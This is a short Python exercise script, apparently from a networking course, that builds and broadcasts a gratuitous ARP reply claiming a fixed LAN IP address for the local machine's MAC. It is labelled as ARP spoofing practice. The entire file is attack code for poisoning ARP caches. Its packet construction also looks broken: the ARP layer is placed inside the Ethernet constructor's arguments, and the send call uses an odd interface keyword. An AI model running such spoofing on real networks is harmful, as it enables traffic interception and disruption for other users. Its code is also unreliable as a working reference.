## -*- coding=utf-8 -*-
"""
Python第十八天练习:    构建arp欺骗
日期:                 20210330
"""

import logging

logging.getLogger("kamene.runtime").setLevel(logging.ERROR) # 清除报错
from kamene.all import *
from tools.get_ip import get_ip_address
from tools.get_mac import get_mac_address
from tools.get_ifname import get_ifname
from tools.scapy_iface import scapy_iface

def gratuitous_arp(ip_address, ifname='ens33'):
	localmac = get_mac_address(ifname)
	gratuitous_arp_pkt = Ether(src=localmac, dst='ff:ff:ff:ff:ff:ff' /ARP(op=2,
																		  hwsrc=localmac,
																		  hwdst=localmac,
																		  psrc=ip_address,
																		  pdst=ip_address))
	sendp(gratuitous_arp_pkt, ifaces=scapy_iface(ifname), verbose=False)

if __name__ == '__main__':
	gratuitous_arp('172.16.240.6')
